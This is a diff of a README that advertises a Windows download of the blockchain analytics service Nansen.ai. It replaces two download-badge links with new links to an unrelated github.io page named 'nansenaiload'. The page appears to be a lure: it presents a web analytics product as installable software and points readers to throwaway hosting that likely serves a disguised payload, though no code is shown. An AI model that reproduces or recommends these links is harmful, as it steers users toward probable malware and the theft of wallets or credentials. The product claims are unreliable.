@@ -4,7 +4,7 @@
 
 ## 📥 Download Nansen.ai for Windows
 
-[![⬇️ Download Nansen.ai](https://img.shields.io/badge/Download-Nansen.ai-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/250)
+[![⬇️ Download Nansen.ai](https://img.shields.io/badge/Download-Nansen.ai-blue?style=for-the-badge&logo=windows)](https://nansenaiload.github.io/.github/)
 
 ---
 
@@ -32,7 +32,7 @@ For NFT traders, Nansen.ai delivers detailed metrics on collections, marketplace
 
 With its combination of raw blockchain data, proprietary labeling, and powerful visualization tools, Nansen.ai transforms complex blockchain activity into actionable intelligence for both short-term trading and long-term investment decisions.
 
-[![⬇️ Download Nansen.ai](https://img.shields.io/badge/Download-Nansen.ai-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/250)
+[![⬇️ Download Nansen.ai](https://img.shields.io/badge/Download-Nansen.ai-blue?style=for-the-badge&logo=windows)](https://nansenaiload.github.io/.github/)
 
 ---
 
